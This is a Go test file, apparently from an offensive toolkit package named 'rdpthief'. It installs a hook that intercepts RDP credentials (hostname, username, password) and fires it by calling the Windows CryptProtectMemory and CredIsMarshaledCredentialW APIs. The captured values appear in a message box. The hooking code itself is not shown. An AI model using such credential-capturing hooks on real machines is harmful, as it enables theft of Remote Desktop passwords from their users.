// +build windows

package rdpthief

import (
	"fmt"
	"testing"
	"unsafe"

	"github.com/stretchr/testify/require"
	"golang.org/x/sys/windows"
)

func TestHook(t *testing.T) {
	hook := NewHook(func(cred *Credential) {
		text := fmt.Sprintf(
			"hostname: \"%s\"\nusername: \"%s\"\npassword: \"%s\"",
			cred.Hostname, cred.Username, cred.Password,
		)
		textPtr := windows.StringToUTF16Ptr(text)
		captionPtr := windows.StringToUTF16Ptr("credential:")
		_, err := windows.MessageBox(0, textPtr, captionPtr, 0)
		require.NoError(t, err)
	})
	err := hook.Install()
	require.NoError(t, err)

	password := []byte{
		0x0c, 0x00, 0x00, 0x00, 0x61, 0x00, 0x61, 0x00, 0x61, 0x00,
		0x73, 0x00, 0x73, 0x00, 0x73, 0x00,
	}
	proc := windows.NewLazySystemDLL("crypt32.dll").NewProc("CryptProtectMemory")
	ret, _, _ := proc.Call(uintptr(unsafe.Pointer(&password[0])), 16, 1)
	fmt.Println("1", ret)

	fmt.Printf("0x%X\n", proc.Addr())

	ptr2 := windows.StringToUTF16Ptr("username")
	proc = windows.NewLazySystemDLL("advapi32.dll").NewProc("CredIsMarshaledCredentialW")
	ret, _, _ = proc.Call(uintptr(unsafe.Pointer(ptr2)))
	fmt.Println("2", ret)

	fmt.Printf("0x%X\n", proc.Addr())

	// 	select {}

	err = hook.Uninstall()
	require.NoError(t, err)
	//
	// asd := Hook{}
	// err = asd.Install()
	// require.NoError(t, err)

}
